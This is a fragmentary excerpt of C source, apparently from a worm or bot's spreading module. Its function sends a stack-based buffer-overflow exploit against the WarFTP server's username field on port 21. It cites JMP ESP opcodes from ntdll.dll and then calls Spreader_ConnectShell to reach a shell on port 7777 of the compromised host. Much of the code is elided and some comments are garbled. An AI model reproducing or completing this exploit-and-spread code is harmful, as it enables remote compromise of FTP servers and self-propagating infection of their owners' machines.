...
void ftpsplo(exparam_s exparam) {
 ...
 //  system("cls");
  // fprintf(stdout, "\n\tWarFTP Username Stack-Based //Buffer-Overflow Vulnerability\n");
 //  fprintf(stdout, "     //______________________________________________________//______________\n\n");
//     
 //  if (((argc == 3) && (atoi(argv[2]) >= 0) && //(atoi(argv[2]) < 14)) || ((argc == 4) && (atoi(argv[2]) //== 14))) {
      ...
      if (WSAStartup(MAKEWORD(2, 0), &wsaData) == 0) {
         if ((sockData = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
            ...
            their_addr.sin_addr.s_addr = exparam.ip;      // ; IP Address = Argv[1]
            their_addr.sin_port = exparam.port;                    // ; Port = 21
  ...
  /*                      - OPcodes from ntdll.dll -> JMP ESP -                     */
                     ...
                     */
                     ...
                     if (!err) {
                        ...
                        Spreader_ConnectShell(exparam, 7777);
